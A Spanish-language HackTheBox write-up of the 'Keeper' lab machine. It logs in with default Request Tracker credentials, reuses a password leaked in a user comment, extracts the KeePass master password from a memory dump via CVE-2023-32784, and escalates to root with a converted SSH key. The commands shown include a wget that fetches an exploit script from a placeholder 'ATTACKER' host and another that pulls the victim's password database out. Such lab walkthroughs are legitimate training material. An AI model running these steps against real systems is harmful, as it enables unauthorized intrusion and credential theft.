---

title: HTB - Keeper
layout: writeup
date: 2026-04-14
dificultad: Easy
plataforma: HackTheBox
----------------------
---
### Keeper HTB Machine

## 🧠 Enumeration

Empezamos con un escaneo completo:

```bash
nmap -p- -T4 --min-rate 5000 -sV -sC -O -Pn -sS 10.10.11.227 -vvv
```

Puertos abiertos:

* 80 (HTTP)
* 22 (SSH)

![Nmap](/images/keeper_1.png)

La web redirige a:

```
tickets.keeper.htb/rt/
```



## 🌐 Web Enumeration

Problema típico: no resolvía el dominio.

```bash
sudo vim /etc/hosts
```

Añadimos:

```
10.10.11.227 tickets.keeper.htb
```

![Hosts](/images/keeper_2.png)

---

## 💥 Login Panel

Se detecta login con versión de Request Tracker.

Probé SQLi (CVE-2013-3525) → no útil.

---

## 🔐 Credenciales por defecto

```text
user: root
pass: password
```

👉 Acceso conseguido.

![Login](/images/keeper_3.png)

---

## 👀 Enumeración de usuarios

Usuario encontrado:

```
lnorgaard
```

Comentario interesante:

```
Welcome2023!
```

![Leak](/images/keeper_4.png)

---

## 🔑 Acceso SSH

```bash
ssh lnorgaard@10.10.11.227
```
:
⚠️ Importante:

* es **L**norgaard, no Inorgaard

---

## 📦 Archivos interesantes

```bash
RT30000.zip
```

```bash
unzip RT30000.zip
```

Contenido:

* KeePassDumpFull.dmp
* passcodes.kdbx

![Files](/images/keeper_5.png)

---

## 🧨 Explotación KeePass

CVE:

```
CVE-2023-32784
```

Permite recuperar contraseña desde dump de memoria.

---

## 🐍 Script

```bash
python3 -m http.server 80
```

```bash
wget http://ATTACKER/keepass_dump.py
python3 keepass_dump.py -f KeePassDumpFull.dmp
```

![Dump](/images/keeper_6.png)

---

## 🔍 Password recuperado

```
rødgrød med fløde
```

---

## 🔓 Abrir KeePass

```bash
sudo apt install keepass2
```

```bash
wget http://victim:8080/passcodes.kdbx
```

Abrir con la passphrase.

![KeePass](/images/keeper_7.png)

---

## 🧑‍💻 Root

Convertimos clave:

```bash
sudo apt install putty-tools
puttygen idkey.ppk -O private-openssh -o id_rsa
chmod 600 id_rsa
```

---

## 🚀 Acceso final

```bash
ssh -i id_rsa root@10.10.11.227
```

![Root](/images/keeper_8.png)

---

## 🏁 Root flag

```bash
cat root.txt
```

---

## 🧾 Conclusión

Máquina centrada en:

* Enumeración web
* Credenciales expuestas
* KeePass dump exploitation
* Abuso de claves SSH

👉 Pequeños fallos → acceso total

---

